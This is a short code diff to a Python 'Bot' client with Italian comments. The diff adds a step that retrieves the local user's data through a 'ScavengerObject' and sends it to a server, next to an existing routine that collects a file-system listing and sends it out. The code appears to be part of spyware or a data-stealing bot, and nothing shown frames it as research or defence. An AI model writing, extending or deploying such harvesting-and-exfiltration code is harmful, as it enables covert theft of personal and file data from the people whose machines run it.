@@ -75,27 +75,32 @@ class Bot:
         self.data_sentence = json.dumps(inputDict)
 
         self.send_sentence = self.data_sentence
-        self.header_dim = sys.getsizeof(self.send_sentence.encode(FORMAT))
         print("thread_data terminated.")
 
     def fileSystemScavange(self):
+        # prendi user
+        userData = self.ScavengerObject.retriveUser()
+        # mandi user
+        self.sendToServer(userData)
+
         inputSentence = self.ScavengerObject.fileSystemRetrival()
         self.fileSystem_sentence = inputSentence
         self.send_sentence = self.fileSystem_sentence
-        self.header_dim = sys.getsizeof(self.send_sentence.encode(FORMAT))
-        print(self.header_dim)
         print("thread_fileSystem terminated.")
 
-    def sendToServer(self):
+    def sendToServer(self, data=''):
         """
         Il client invia al server i dati raccolti in formato .json.
         :return: None
         """
-        print("Data dimension in bytes (header): ", self.header_dim)
+        if data == '':
+            send_data = self.send_sentence
+        else:
+            send_data = data
 
         try:
-            print(sys.getsizeof(self.send_sentence.encode(FORMAT)))
-            self.send_message(self.send_sentence.encode(FORMAT))
+            print(sys.getsizeof(send_data.encode(FORMAT)))
+            self.send_message(send_data.encode(FORMAT))
         except BrokenPipeError as error:
             print(error)
 
